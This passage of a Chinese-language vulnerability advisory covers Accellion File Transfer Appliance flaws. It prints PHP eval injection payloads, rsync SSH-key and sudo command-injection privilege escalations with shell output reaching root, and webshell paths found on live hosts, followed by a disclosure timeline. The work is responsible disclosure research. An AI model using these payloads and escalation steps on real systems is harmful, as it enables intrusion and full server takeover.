<span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span> <span class="s1">'/(.+)\(.*\)/'</span><span class="p">,</span> <span class="nv">$func_call</span><span class="p">,</span> <span class="nv">$func_match</span> <span class="p">))</span> <span class="p">{</span>
    <span class="nv">$orig_func</span> <span class="o">=</span> <span class="nv">$func_call</span><span class="p">;</span>
    <span class="nv">$func_call</span> <span class="o">=</span> <span class="nv">$func_match</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
<span class="p">}</span>
<span class="nv">$cs_method</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span> <span class="s1">'delete_session_cache'</span><span class="p">,</span> <span class="s1">'delete_user_contact'</span><span class="p">,</span> <span class="s1">'valid_password'</span><span class="p">,</span> <span class="s1">'user_password_update_disallowed'</span><span class="p">,</span> <span class="s1">'user_password_format_disallowed'</span><span class="p">,</span> <span class="s1">'get_user_contact_list'</span><span class="p">,</span> <span class="s1">'user_email_verified'</span><span class="p">,</span> <span class="s1">'user_exist_allow_direct_download'</span><span class="p">,</span> <span class="s1">'user_profile_auth'</span> <span class="p">);</span>
<span class="k">if</span> <span class="p">((</span> <span class="o">!</span><span class="nv">$func_call</span> <span class="o">||</span> <span class="o">!</span><span class="nb">in_array</span><span class="p">(</span> <span class="nv">$func_call</span><span class="p">,</span> <span class="nv">$cs_method</span> <span class="p">)</span> <span class="p">))</span> <span class="p">{</span>
    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$orig_func</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$func_call</span> <span class="o">=</span> <span class="nv">$orig_func</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$func_call</span>  <span class="o">==</span> <span class="s1">'get_user_contact_list'</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$_csinfo</span><span class="p">[</span><span class="s1">'user_id'</span><span class="p">])</span> <span class="p">{</span>
        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span> <span class="s1">'/[\\\/"\*\:\?\&lt;\&gt;\|&amp;]/'</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]</span> <span class="p">))</span> <span class="p">{</span>
        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nv">$func_call</span> <span class="o">=</span> <span class="s1">'echo(count('</span> <span class="mf">.</span> <span class="nv">$func_call</span> <span class="mf">.</span> <span class="s1">'("'</span> <span class="mf">.</span> <span class="nv">$_csinfo</span><span class="p">[</span><span class="s1">'user_id'</span><span class="p">]</span> <span class="mf">.</span> <span class="s1">'", array("nickname"=&gt;"'</span> <span class="mf">.</span> <span class="nb">addslashes</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]</span> <span class="p">)</span> <span class="mf">.</span> <span class="s1">'"))));'</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'p1'</span><span class="p">]</span> <span class="p">))</span> <span class="p">{</span>
        <span class="nv">$func_param</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>  <span class="p">);</span>
        <span class="nv">$p_no</span> <span class="o">=</span> <span class="mi">7</span><span class="p">;</span>

        <span class="k">while</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'p'</span> <span class="mf">.</span> <span class="nv">$p_no</span><span class="p">]</span> <span class="p">))</span> <span class="p">{</span>
            <span class="nv">$func_param</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span> <span class="s1">'\''</span><span class="p">,</span> <span class="s1">'\\\''</span><span class="p">,</span> <span class="nb">str_replace</span><span class="p">(</span> <span class="s1">'$'</span><span class="p">,</span> <span class="s1">'\\$'</span><span class="p">,</span> <span class="nb">addslashes</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'p'</span> <span class="mf">.</span> <span class="nv">$p_no</span><span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">);</span>
            <span class="o">++</span><span class="nv">$p_no</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="nv">$func_call</span> <span class="o">=</span> <span class="s1">'echo('</span> <span class="mf">.</span> <span class="nv">$func_call</span> <span class="mf">.</span> <span class="s1">'("'</span> <span class="mf">.</span> <span class="nb">join</span><span class="p">(</span> <span class="s1">'", "'</span><span class="p">,</span> <span class="nv">$func_param</span> <span class="p">)</span> <span class="mf">.</span> <span class="s1">'"));'</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">echo</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span> <span class="nv">$func_call</span> <span class="p">);</span></code></pre></figure>

<p>如果已知加密 KEY 的話，即可控制 <code class="language-plaintext highlighter-rouge">decrypt( $_POST[fc] )</code> 的輸出，而後面的正規表示式雖然針對函數名稱進行白名單過濾，但是沒對參數進行過濾，如此一來我們可以在參數的部分插入任意代碼，唯一的條件就是不能有 <code class="language-plaintext highlighter-rouge">(</code> <code class="language-plaintext highlighter-rouge">)</code> 出現，但由於 PHP 的鬆散特性，玩法其實很多，這裡列舉兩個：</p>

<p><br />
直接透過反引號執行系統指令：</p>

<blockquote>
  <p>user_profile_auth(`$_POST[cmd]`);</p>
</blockquote>

<p><br />
更優雅的方式可以透過 include 語法引入上傳檔案的 tmp_name，這樣各種保護都不用擔心：</p>

<blockquote>
  <p>user_profile_auth(include $_FILES[file][tmp_name]);</p>
</blockquote>

<p><br /></p>

<h4 id="local-privilege-escalation-cve-2016-2352-and-cve-2016-2353">Local Privilege Escalation (CVE-2016-2352 and CVE-2016-2353)</h4>
<p>在取得 PHP 網頁權限後，發現所屬權限為 nobody，為了進行更深入的研究，在對環境進行審視後，發現兩個可用來提升權限之弱點。</p>

<h5 id="1-rsync-配置錯誤">1. Rsync 配置錯誤</h5>

<div class="highlight-name">/etc/opt/rsyncd.conf</div>

<figure class="highlight"><pre><code class="language-lighttpd" data-lang="lighttpd">log file = /home/soggycat/log/kennel.log
...
[soggycat]
path = /home/soggycat
uid = soggycat
read only = false
list = false
...</code></pre></figure>

<p>其中模組名稱 soggycat 對 <code class="language-plaintext highlighter-rouge">/home/soggycat/</code> 為任何人可讀可寫，所以可將 SSH Key 寫至 /home/soggycat/.ssh/ 後以 soggycat 身分登入</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">bash-3.2<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>99<span class="o">(</span>nobody<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>99<span class="o">(</span>nobody<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>99<span class="o">(</span>nobody<span class="o">)</span>

bash-3.2<span class="nv">$ </span>rsync 0::soggycat/.ssh/
drwx------        4096 2016/01/29 18:13:41 <span class="nb">.</span>
<span class="nt">-rw-r--r--</span>         606 2016/01/29 18:13:41 authorized_keys

bash-3.2<span class="nv">$ </span>rsync 0::soggycat/.ssh/authorized_keys <span class="nb">.</span>
bash-3.2<span class="nv">$ </span><span class="nb">cat </span>id_dsa.pub <span class="o">&gt;&gt;</span> authorized_keys
bash-3.2<span class="nv">$ </span>rsync authorized_keys 0::soggycat/.ssh/

bash-3.2<span class="nv">$ </span>ssh <span class="nt">-i</span> id_dsa <span class="nt">-o</span> <span class="nv">UserKnownHostsFile</span><span class="o">=</span>/dev/null <span class="nt">-o</span> <span class="nv">StrictHostKeyChecking</span><span class="o">=</span>no soggycat@localhost <span class="nb">id
</span>Could not create directory <span class="s1">'/.ssh'</span><span class="nb">.</span>
Warning: Permanently added <span class="s1">'0,0.0.0.0'</span> <span class="o">(</span>RSA<span class="o">)</span> to the list of known hosts.
<span class="nv">uid</span><span class="o">=</span>520<span class="o">(</span>soggycat<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>99<span class="o">(</span>nobody<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>99<span class="o">(</span>nobody<span class="o">)</span></code></pre></figure>

<p><br /></p>

<h5 id="2-command-injection-in-yum-clientpl">2. Command Injection in “yum-client.pl”</h5>

<p>在 FTA 中，為了使系統可以直接透過網頁介面進行更新，因此在 sudoers 配置中特別針對 nobody 用戶允許直接使用 root 權限執行指令，並透過 <code class="language-plaintext highlighter-rouge">yum-client.pl</code> 這隻程式進行軟體更新</p>

<div class="highlight-name">/etc/sudoers</div>

<figure class="highlight"><pre><code class="language-apache" data-lang="apache"><span class="err">...</span>
Cmnd_Alias      YUM_UPGRADE = /usr/bin/yum -y upgrade
Cmnd_Alias      YUM_CLIENT = /usr/local/bin/yum-client.pl
<span class="err">...</span>
<span class="c"># User privilege specification</span>
root     ALL=(ALL) <span class="ss">ALL</span>
admin    <span class="ss">ALL</span> =NOPASSWD: UPDATE_DNS, UPDATE_GW, UPDATE_NTP, RESTART_NETWORK, CHMOD_OLDTEMP ...
nobody   <span class="ss">ALL</span> =NOPASSWD: SSL_SYSTEM, ADMIN_SYSTEM, IPSEC_CMD, YUM_CLIENT
soggycat <span class="ss">ALL</span> =NOPASSWD: ADMIN_SYSTEM, IPSEC_CMD, CHOWN_IPSEC, UPDATE_IPSEC, YUM_CLIENT
radmin   <span class="ss">ALL</span> =NOPASSWD: RESET_APPL
<span class="err">...</span></code></pre></figure>

<p><br /></p>

<p>其中 YUM_CLIENT 就是進行更新的指令，部分代碼如下：</p>

<div class="highlight-name">/usr/local/bin/yum-client.pl</div>

<figure class="highlight"><pre><code class="language-perl" data-lang="perl"><span class="o">...</span>
<span class="nv">GetOptions</span> <span class="p">(</span>
   <span class="p">'</span><span class="s1">help</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="o">\</span><span class="nv">$help</span><span class="p">,</span>
   <span class="p">'</span><span class="s1">download_only</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="o">\</span><span class="nv">$download_only</span><span class="p">,</span>
   <span class="p">'</span><span class="s1">list</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="o">\</span><span class="nv">$list</span><span class="p">,</span>
   <span class="p">'</span><span class="s1">cache</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="o">\</span><span class="nv">$cache</span><span class="p">,</span>
   <span class="p">'</span><span class="s1">clearcache</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="o">\</span><span class="nv">$clearcache</span><span class="p">,</span>
   <span class="p">'</span><span class="s1">cdrom=s</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="o">\</span><span class="nv">$cdrom</span><span class="p">,</span>
   <span class="p">'</span><span class="s1">appid=s</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="o">\</span><span class="nv">$appid</span><span class="p">,</span>
   <span class="p">'</span><span class="s1">servername=s</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="o">\</span><span class="nv">$servername</span><span class="p">,</span>
   <span class="p">'</span><span class="s1">version=s</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="o">\</span><span class="nv">$version</span><span class="p">,</span>
   <span class="p">'</span><span class="s1">token=s</span><span class="p">'</span> <span class="o">=&gt;</span> <span class="o">\</span><span class="nv">$token</span><span class="p">);</span>

<span class="k">my</span> <span class="nv">$YUM_CMD</span> <span class="o">=</span> <span class="p">"</span><span class="s2">/usr/bin/yum</span><span class="p">";</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$cache</span><span class="p">){</span>
  <span class="nv">$YUM_CMD</span> <span class="o">=</span> <span class="p">"</span><span class="si">$YUM_CMD</span><span class="s2"> -C</span><span class="p">";</span>
<span class="p">}</span>

<span class="c1"># if this is based on RHEL 5, change the repository</span>
<span class="k">my</span> <span class="nv">$OS</span> <span class="o">=</span> <span class="p">`</span><span class="sb">grep -q 5 /etc/redhat-release &amp;&amp; echo -n 5</span><span class="p">`;</span>
<span class="k">my</span> <span class="nv">$LOGFILE</span> <span class="o">=</span> <span class="p">"</span><span class="s2">/home/seos/log/yum-client.log</span><span class="p">";</span>
<span class="k">my</span> <span class="nv">$STATUSFILE</span> <span class="o">=</span> <span class="p">"</span><span class="s2">/home/seos/log/yum-client.status</span><span class="p">";</span>
<span class="k">my</span> <span class="nv">$YUMCONFIG</span> <span class="o">=</span> <span class="p">"</span><span class="s2">/etc/yum.conf</span><span class="p">";</span>
<span class="k">my</span> <span class="nv">$YUMDIFF_FILE</span> <span class="o">=</span> <span class="p">'</span><span class="s1">/home/seos/log/yum.diff</span><span class="p">';</span>

<span class="k">if</span> <span class="p">(</span><span class="nv">$cdrom</span><span class="p">){</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$OS</span> <span class="ow">eq</span> <span class="p">"</span><span class="s2">5</span><span class="p">"){</span>
     <span class="nv">$YUM_CMD</span> <span class="o">=</span> <span class="p">"</span><span class="si">$YUM_CMD</span><span class="s2"> -c </span><span class="si">$cdrom_path</span><span class="s2">/yum.conf-5</span><span class="p">";</span>
  <span class="p">}</span><span class="k">else</span><span class="p">{</span>
     <span class="nv">$YUM_CMD</span> <span class="o">=</span> <span class="p">"</span><span class="si">$YUM_CMD</span><span class="s2"> -c </span><span class="si">$cdrom_path</span><span class="s2">/yum.conf</span><span class="p">";</span>
  <span class="p">}</span>
  <span class="nb">system</span><span class="p">("</span><span class="s2">mkdir -p /mnt/cdrom &amp;&amp; mount -o loop </span><span class="si">$cdrom</span><span class="s2"> </span><span class="si">$cdrom_path</span><span class="p">")</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">or</span> <span class="nv">fdielog</span><span class="p">(</span><span class="nv">$LOGFILE</span><span class="p">,"</span><span class="s2">unable to mount: $!</span><span class="p">");</span>
<span class="p">}</span></code></pre></figure>

<p>深入觀察 <code class="language-plaintext highlighter-rouge">yum-client.pl</code> 後可發現在 <code class="language-plaintext highlighter-rouge">--cdrom</code> 參數上存在 Command Injection，使得攻擊者可將任意指令插入參數內並以 root 身分執行</p>

<p>所以使用如下指令：</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash">bash-3.2<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>99<span class="o">(</span>nobody<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>99<span class="o">(</span>nobody<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>99<span class="o">(</span>nobody<span class="o">)</span>

bash-3.2<span class="nv">$ </span><span class="nb">sudo</span> /usr/local/bin/yum-client.pl <span class="nt">--cdrom</span><span class="o">=</span><span class="s1">'$(id &gt; /tmp/.gg)'</span>
mount: can<span class="s1">'t find /mnt/cdrom in /etc/fstab or /etc/mtab
unable to mount: Bad file descriptor at /usr/local/bin/yum-client.pl line 113.


bash-3.2$ cat /tmp/.gg
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)</span></code></pre></figure>

<p>即可以 root 身分執行任意指令！
<br /></p>

<h3 id="後門">後門</h3>
<p><br />
在取得最高權限後，開始對伺服器進行一些審視時，發現已有幾款後門藏在 FTA 主機中了，經過研究後首先確認一款 IRC BOT 為 Niara 所發布的 <a href="http://www.niara.com/docs/ta-accellion-fta-cve-2015-2857.pdf">弱點報告</a> 中有提及，此外，額外發現兩款不同類型的 PHP Webshell 並無在公開的報告中發現，透過 Apache Log 時間推測應該是透過 2015 年中的 CVE-2015-2857 所放置之後門。</p>

<p>PHPSPY 後門，全球 1217 台存活主機上共發現 62 台，放置路徑於：</p>

<blockquote>
  <p>https://&lt;fta&gt;/courier/themes/templates/Redirector_Cache.php</p>
</blockquote>

<p>WSO 後門，全球 1217 台存活主機上共發現 9 台，放置路徑於：</p>

<blockquote>
  <p>https://&lt;fta&gt;/courier/themes/templates/imag.php</p>
</blockquote>

<p><br /></p>

<h3 id="致謝">致謝</h3>
<p><br />
這份 Advisory 所提及的弱點為在 2016 二月時參加 Facebook Bug Bounty 時尋找到的，詳情可參考文章《<a href="https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/">滲透 Facebook 的思路與發現</a>》，找到弱點的當下立即回報包括 Accellion 及 Facebook，Accellion 並在 2/12 號將此份弱點記錄在 FTA_9_12_40 並通知所有受影響的客戶安裝修補程式。</p>

<p>感謝 Facebook 以及 Accellion 的迅速反應跟配合 : )
<br /></p>

<h3 id="timeline">Timeline</h3>

<ul>
  <li>2016/02/06 05:21 聯絡 Accellion 詢問何處可回報弱點</li>
  <li>2016/02/07 12:35 將報告寄至 Accellion Support Team</li>
  <li>2016/03/03 03:03 Accellion Support Team 通知會在 FTA_9_12_40  修復</li>
  <li>2016/05/10 15:18 詢問將撰寫 Advisory 許可及通知發現兩款後門存在</li>
  <li>2016/06/06 10:20 雙方討論定稿</li>
</ul>

<h3 id="參考">參考</h3>
<ul>
  <li><a href="https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857">R7-2015-08: Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)</a> <a name="ref1"></a></li>
  <li><a href="https://www.rapid7.com/resources/advisories/R7-0039.jsp">Rapid7 Advisory R7-0039: Accellion File Transfer Appliance Multiple Vulnerabilities</a> <a name="ref2"></a></li>
  <li><a href="http://www.niara.com/docs/ta-accellion-fta-cve-2015-2857.pdf">Threat Advisory: Accellion File Transfer Appliance Vulnerability</a> <a name="ref3"></a></li>
</ul>


                    </div>
                    <!-- 文章內容 -->
                </div>
            </article>
            <!-- 文章 end -->
        </section>
        
         <!-- 作者 -->
        <section>
            <div class="container article_footer">
                <div class="author_info">
                    <a href="/blog/author/orange">
                        <div class="circle" style="background-image: url(/assets/img/avatar/orig/orange.png);"></div>
                    </a>
                    <div>
                        <a class="author" href="/blog/author/orange">
                            <h3>Orange Tsai</h3>
                        </a>
                        <span>Principal Security Researcher</span>
                        <p>
                            I am Orange : )
                        </p>
                    </div>
                </div>
            </div>
        </section>
        

        <!-- 相關文章 -->
        <section class="recommand articles-list">
            <div class="container">
              
                <!-- 相關文章 Item -->
                <article class="article">
                    <div class="content">
                        <a class="category" href="/blog/category/技術專欄">技術專欄</a>
                        <span class="tag">
    
                          <a href="/blog/tag/CVE/">#CVE</a> <a href="/blog/tag/Vulnerability/">#Vulnerability</a> <a href="/blog/tag/Windows/">#Windows</a> <a href="/blog/tag/Kernel/">#Kernel</a> <a href="/blog/tag/Advisory/">#Advisory</a> 
                        </span>
                        <h2>
                            <a href="/blog/2024/10/05/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part2/">Streaming vulnerabilities from Windows Kernel - Proxying to Kernel - Part II</a> 
                        </h2>
                    
                    
                        <a class="author" href="/blog/author/orange">
                            <h3>angelboy</h3>
                        </a>
                    
                        <span class="date">2024-10-05</span>
                        <p class="line-litmit-3">這篇研究將延續 Kernel Streaming 的攻擊面，深入探討在 Kernel Streaming 的另一個功能中找到的新漏洞，並揭露如何利用這個 Bug Class 成功攻擊 Windows 11，此議題亦發表於 HEXACON 2024 中。
                        </p>
                    </div>
                </article>
              
                <!-- 相關文章 Item -->
                <article class="article">
                    <div class="content">
                        <a class="category" href="/blog/category/最新消息">最新消息</a>
                        <span class="tag">
    
                          <a href="/blog/tag/公告/">#公告</a> <a href="/blog/tag/資安人才/">#資安人才</a> 
                        </span>
                        <h2>
                            <a href="/blog/2024/09/06/2024-devcore-cybersecurity-scholarship-application-opens/">DEVCORE 2024 全國資訊安全獎學金、資安教育活動贊助計畫即日起開放報名</a> 
                        </h2>
                    
                    
                        <span class="date">2024-09-06</span>
                        <p class="line-litmit-3">「戴夫寇爾全國資訊安全獎學金」歡迎所有在資訊安全領域有出眾研究成果的學生報名申請，有意申請者須提出學習資安的動機與歷程，並繳交資安研究或比賽成果，我們將從中擇優選取 10 名，獲選者可獲最高 2 萬元的研究補助
                        </p>
                    </div>
                </article>
              
                <!-- 相關文章 Item -->
                <article class="article">
                    <div class="content">
                        <a class="category" href="/blog/category/技術專欄">技術專欄</a>
                        <span class="tag">
    
                          <a href="/blog/tag/CVE/">#CVE</a> <a href="/blog/tag/Vulnerability/">#Vulnerability</a> <a href="/blog/tag/Windows/">#Windows</a> <a href="/blog/tag/Kernel/">#Kernel</a> <a href="/blog/tag/Advisory/">#Advisory</a> 
                        </span>
                        <h2>
                            <a href="/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1/">Streaming vulnerabilities from Windows Kernel - Proxying to Kernel - Part I</a> 
                        </h2>
                    
                    
                        <a class="author" href="/blog/author/orange">
                            <h3>angelboy</h3>
                        </a>
                    
                        <span class="date">2024-08-23</span>
                        <p class="line-litmit-3">在這篇研究將講述一個長期被忽視的攻擊面，讓我們在兩個月內就找出了超過 10 個漏洞。此外，也將深入探討了一種 Proxy-Based 的邏輯漏洞類型，使我們可以忽略掉大多數的檢查，最終成功在 Pwn2Own Vancouver 2024 中，攻下 Windows 11 的項目。
                        </p>
                    </div>
                </article>
              

            </div>
        </section>
    </div>

    <!-- footer -->
    <footer>
<div class="container footer">
    <div class="logo">
        <a href="/">
            <img src="/images/logo.svg"/>
        </a>
        <div class="social">
            <a href="https://www.facebook.com/D3VC0RE"><i class="icon facebook"></i></a>
            <a href="https://twitter.com/d3vc0r3"><i class="icon twitter"></i></a>
        </div>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">服務</h6>
        <ul>
            <li><a href="/services/red-team/">紅隊演練</a></li>
            <li><a href="/services/penetration-test/">滲透測試</a></li>
            <li><a href="/services/security-consulting/">資安顧問服務</a></li>
            <li><a href="/services/security-training/">資安教育訓練</a></li>
        </ul>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">研究</h6>
        <ul>
            <li><a href="/research/overview/">總覽概要</a></li>
            <li><a href="/research/awards/">競賽與獎項</a></li>
            <li><a href="/research/bug-bounty/">企業漏洞回報</a></li>
            <li><a href="/research/talks/">國際研討會</a></li>
            <li><a href="/research/cve/">CVE 漏洞列表</a></li>
        </ul>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">公司</h6>
        <ul>
            <li><a href="/company/about/">公司簡介</a></li>
            <li><a href="/company/our-team/">團隊成員</a></li>
            <li><a href="/company/history/">成就與沿革</a></li>
            <li><a href="/company/csr/">企業社會責任</a></li>
            <li><a href="/company/jobs/">工作機會</a></li>
            <li><a href="/contact/">聯絡我們</a></li>
        </ul>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">新聞</h6>
        <ul>
            <li><a href="/blog/">BLOG</a></li>
            <li><a href="/media-kit/">媒體素材下載</a></li>
        </ul>
    </div>

    <!-- divider 分隔線 -->
    <div class="divider"></div>

    <div class="copyright">
        <div class="info">
            <span>© 2024 DEVCORE 戴夫寇爾股份有限公司. <b class="line-block">All rights reserved.</b></span>
            <span><a href="/privacy-policy/">Privacy Policy</a></span>
        </div>
        <div class="lang">
            <!-- <i class="icon translate"></i>
            <select>
                <option value="">Language</option>
                <option value="">中文</option>
                <option value="">English</option>
            </select> -->
            <span>Language :<a href="/">中文</a>|<a href="/en/">English</a></span>
        </div>
    </div>

</div>
    </footer>
</body>
</html>

